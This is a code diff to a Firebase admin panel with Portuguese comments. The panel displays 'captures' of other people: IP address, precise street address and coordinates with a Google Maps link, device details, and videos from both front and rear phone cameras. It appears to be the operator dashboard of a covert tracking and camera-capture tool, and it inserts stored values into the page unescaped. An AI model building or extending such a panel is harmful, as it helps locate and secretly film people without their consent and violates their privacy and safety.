@@ -5,8 +5,6 @@ firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const database = firebase.database();
 
-// ... Resto da classe AdminPanel como você enviou ...
-
 class AdminPanel {
     constructor() {
         this.currentUser = null;
@@ -273,40 +271,137 @@ class AdminPanel {
 
     async loadCaptures() {
         this.capturesList.innerHTML = `<div class="loading"><div class="spinner"></div>Carregando capturas...</div>`;
-        const ref = database.ref(`users/${this.currentUser.uid}/captures`);
 
         try {
+            const ref = database.ref(`users/${this.currentUser.uid}/captures`);
             const snapshot = await ref.once('value');
             const captures = snapshot.val();
 
             if (!captures) {
-                this.capturesList.innerHTML = `<p style="color:white;">Nenhuma captura registrada ainda.</p>`;
+                this.capturesList.innerHTML = `<p style="color:white;">Nenhuma captura ainda.</p>`;
                 return;
             }
 
-            const captureItems = Object.values(captures).reverse().map(data => {
-                const date = new Date(data.timestamp || Date.now()).toLocaleString();
-                const location = data.localizacao?.endereco_completo
-                    || `${data.localizacao?.rua || ''}, ${data.localizacao?.bairro || ''}, ${data.localizacao?.cidade || ''}`.trim()
-                    || 'Não informada';
+            const items = Object.values(captures)
+                .sort((a, b) => b.timestamp - a.timestamp)
+                .map(c => {
+                    const loc = c.localizacao || {};
+                    const date = c.data ? new Date(c.data).toLocaleString('pt-BR') : '—';
 
-                return `
-                    <div class="capture-item">
-                        <div class="capture-header">
-                            <span class="capture-date">${date}</span>
-                        </div>
-                        <div class="capture-details">
-                            <div class="detail-group"><h4>IP</h4><p>${data.ip || 'Desconhecido'}</p></div>
-                            <div class="detail-group"><h4>Dispositivo</h4><p>${data.device || data.platform || 'Desconhecido'}</p></div>
-                            <div class="detail-group"><h4>Navegador</h4><p>${data.userAgent || 'Desconhecido'}</p></div>
-                            <div class="detail-group"><h4>Localização</h4><p>${location}</p></div>
-                        </div>
-                        ${data.videoUrl ? `<video class="video-player" controls src="${data.videoUrl}"></video>` : ''}
-                    </div>
-                `;
-            }).join('');
+                    const endereco = loc.endereco_completo
+                        || [loc.rua, loc.numero, loc.bairro, loc.cidade, loc.regiao, loc.pais].filter(Boolean).join(', ')
+                        || 'Localização não disponível';
 
-            this.capturesList.innerHTML = captureItems;
+                    // Dispositivo resumido: extrai o trecho entre parênteses do userAgent
+                    const uaMatch = (c.userAgent || '').match(/\(([^)]+)\)/);
+                    const dispositivo = uaMatch ? uaMatch[1] : (c.platform || '—');
+
+                    // Botão Google Maps
+                    const mapsBtn = (loc.latitude && loc.longitude)
+                        ? `<a
+                               href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                               target="_blank"
+                               rel="noopener"
+                               style="
+                                   display:inline-flex;
+                                   align-items:center;
+                                   gap:6px;
+                                   margin-top:12px;
+                                   padding:8px 16px;
+                                   background:#4285F4;
+                                   color:#fff;
+                                   border-radius:8px;
+                                   font-size:0.82rem;
+                                   font-weight:600;
+                                   text-decoration:none;
+                                   transition:opacity .2s;
+                               "
+                               onmouseover="this.style.opacity='.85'"
+                               onmouseout="this.style.opacity='1'"
+                           >📍 Abrir no Google Maps</a>`
+                        : '';
+
+                    // Vídeo frontal
+                    const videoFrontal = c.videoFrontalUrl
+                        ? `<div style="flex:1;min-width:0;">
+                               <p style="font-size:0.72rem;color:#aaa;text-align:center;margin:0 0 5px;">📱 Câmera Frontal</p>
+                               <video controls playsinline preload="metadata"
+                                   style="width:100%;border-radius:8px;background:#000;display:block;">
+                                   <source src="${c.videoFrontalUrl}" type="video/webm">
+                               </video>
+                           </div>`
+                        : '';
+
+                    // Vídeo traseiro
+                    const videoTraseira = c.videoTrasieraUrl
+                        ? `<div style="flex:1;min-width:0;">
+                               <p style="font-size:0.72rem;color:#aaa;text-align:center;margin:0 0 5px;">🔭 Câmera Traseira</p>
+                               <video controls playsinline preload="metadata"
+                                   style="width:100%;border-radius:8px;background:#000;display:block;">
+                                   <source src="${c.videoTrasieraUrl}" type="video/webm">
+                               </video>
+                           </div>`
+                        : '';
+
+                    // Fallback para capturas antigas com videoUrl único
+                    const videoLegacy = (!c.videoFrontalUrl && !c.videoTrasieraUrl && c.videoUrl)
+                        ? `<div style="width:100%;">
+                               <p style="font-size:0.72rem;color:#aaa;margin:0 0 5px;">🎥 Vídeo</p>
+                               <video controls playsinline preload="metadata"
+                                   style="width:100%;border-radius:8px;background:#000;display:block;">
+                                   <source src="${c.videoUrl}" type="video/webm">
+                               </video>
+                           </div>`
+                        : '';
+
+                    return `
+                        <div style="
+                            background: rgba(255,255,255,0.06);
+                            border: 1px solid rgba(255,255,255,0.12);
+                            border-radius: 14px;
+                            padding: 16px;
+                            margin-bottom: 20px;
+                        ">
+                            <!-- Vídeos lado a lado -->
+                            <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px;">
+                                ${videoFrontal}
+                                ${videoTraseira}
+                                ${videoLegacy}
+                            </div>
+
+                            <!-- Metadados em grid -->
+                            <div style="
+                                display:grid;
+                                grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+                                gap:12px;
+                                font-size:0.83rem;
+                                color:#ddd;
+                            ">
+                                <div>
+                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">🕐 Data e Hora</span>
+                                    ${date}
+                                </div>
+                                <div>
+                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">🌐 IP</span>
+                                    ${c.ip || '—'}
+                                </div>
+                                <div style="grid-column: 1 / -1;">
+                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">📍 Localização</span>
+                                    ${endereco}
+                                </div>
+                                <div style="grid-column: 1 / -1;">
+                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">📟 Dispositivo</span>
+                                    ${dispositivo}
+                                </div>
+                            </div>
+
+                            ${mapsBtn}
+                        </div>
+                    `;
+                }).join('');
+
+            this.capturesList.innerHTML = items;
+
         } catch (error) {
             console.error('Erro ao carregar capturas:', error);
             this.capturesList.innerHTML = `<p style="color:red;">Erro ao carregar capturas.</p>`;
